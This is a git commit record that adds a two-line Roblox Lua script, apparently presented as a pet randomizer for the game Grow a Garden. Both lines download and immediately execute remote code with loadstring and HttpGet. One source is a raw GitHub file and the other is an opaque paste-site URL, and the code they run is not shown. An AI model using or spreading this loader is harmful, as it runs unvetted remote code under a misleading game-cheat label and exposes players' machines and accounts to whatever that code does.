2c1c700c37ee0b0659077fa95955e8a093b77b00
gagscript-server2 <tiktokbusinessacc08@gmail.com>
2025-07-24 17:15:44 +0800

    Update and rename GAG-RandomizerPets.lua to GAGscript.lua

---
+++ GAGscript.lua
@@ -0,0 +1,2 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/gagscript-server2/PetRandomizerScript/refs/heads/main/growgarden.lua"))()
+loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/2LzjD0nq9zn1xTv7/raw", true))()
